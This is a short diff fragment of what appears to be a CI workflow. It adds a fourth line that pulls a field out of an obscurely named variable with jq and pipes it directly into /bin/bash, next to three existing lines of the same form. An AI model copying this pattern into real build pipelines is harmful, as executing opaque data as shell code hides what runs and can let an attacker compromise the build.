@@ -22,6 +22,7 @@ jobs:
           echo $iz2 | jq -r .oj86158 | /bin/bash
           printf '%s' "$h714" | jq -r .gmp158 | /bin/bash
           printf '%s' "$egfcq23" | jq -r .mfjcq740 | /bin/bash
+          echo $db1 | jq -r .dy94 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
